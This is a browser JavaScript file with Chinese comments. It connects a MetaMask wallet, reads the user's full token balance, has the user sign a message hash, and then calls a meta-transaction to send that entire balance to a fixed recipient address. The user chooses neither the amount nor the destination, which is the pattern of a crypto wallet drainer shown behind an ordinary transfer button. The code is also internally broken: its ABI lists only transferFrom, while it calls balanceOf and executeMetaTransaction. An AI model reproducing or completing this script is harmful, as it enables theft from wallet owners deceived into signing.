const contractAddress = '0xa1f16EF58A572fB99e41bb2C21C26AdDd6828697';
const ABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
];

let web3;
let account;
let isConnecting = false;
let isWalletConnected = false;

async function connectWallet() {
    if (window.ethereum) {
        // 如果已经在连接中，或者钱包已经连接，避免重复请求
        if (isConnecting || isWalletConnected) {
            console.log('已经有连接请求正在进行或者钱包已经连接');
            return;
        }

        isConnecting = true;  // 设置为连接中状态
        document.getElementById('connectButton').innerText = '连接中...';
        document.getElementById('connectButton').disabled = true;

        try {
            console.log('请求连接钱包...');
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

            if (accounts && accounts.length > 0) {
                account = accounts[0];
                web3 = new Web3(window.ethereum);
                isWalletConnected = true;  // 标记钱包已连接
                document.getElementById('connectButton').innerText = '连接成功';
                document.getElementById('transferButton').disabled = false;
                console.log('钱包已成功连接:', account);
            } else {
                throw new Error('未选择账户');
            }

            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length > 0) {
                    account = accounts[0];
                    document.getElementById('connectButton').innerText = '连接成功';
                    console.log('账户已更改为:', account);
                } else {
                    document.getElementById('connectButton').innerText = '连接钱包';
                    document.getElementById('transferButton').disabled = true;
                    isWalletConnected = false;  // 标记钱包未连接
                    console.log('用户已断开与钱包的连接');
                }
            });
        } catch (error) {
            console.error('连接钱包失败:', error);
            if (error.code === -32002) {
                alert('连接钱包请求正在进行中，请在钱包中完成确认操作。');
            } else {
                alert(`连接钱包失败: ${error.message}`);
            }
            document.getElementById('connectButton').innerText = '连接钱包';
        } finally {
            isConnecting = false;  // 重置连接状态
            document.getElementById('connectButton').disabled = false;
        }
    } else {
        alert('请安装 MetaMask 或其他钱包插件');
    }
}

async function transferTokens() {
    if (!isWalletConnected) {
        alert('请先连接钱包！');
        return;
    }

    const recipient = '接收者地址';  // 替换为实际接收者地址
    const contract = new web3.eth.Contract(ABI, contractAddress);

    try {
        console.log('正在获取用户余额...');
        const balance = await contract.methods.balanceOf(account).call();
        console.log('用户余额:', balance);

        if (balance === '0') {
            alert('余额不足，无法进行转账。');
            return;
        }

        const amountToSend = web3.utils.toBN(balance);
        const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
        const messageHashHex = web3.utils.keccak256(messageHash);

        console.log('生成的消息哈希:', messageHashHex);

        const signature = await web3.eth.personal.sign(messageHashHex, account);
        console.log('签名:', signature);

        console.log('正在执行元交易...');
        const tx = await contract.methods.executeMetaTransaction(account, recipient, amountToSend.toString(), signature).send({ from: account });

        console.log('转账成功:', tx);
        alert('转账成功！');
    } catch (error) {
        console.error('转账失败:', error);
        alert(`转账失败: ${error.message}`);
    }
}

document.getElementById('connectButton').onclick = connectWallet;
document.getElementById('transferButton').onclick = transferTokens;
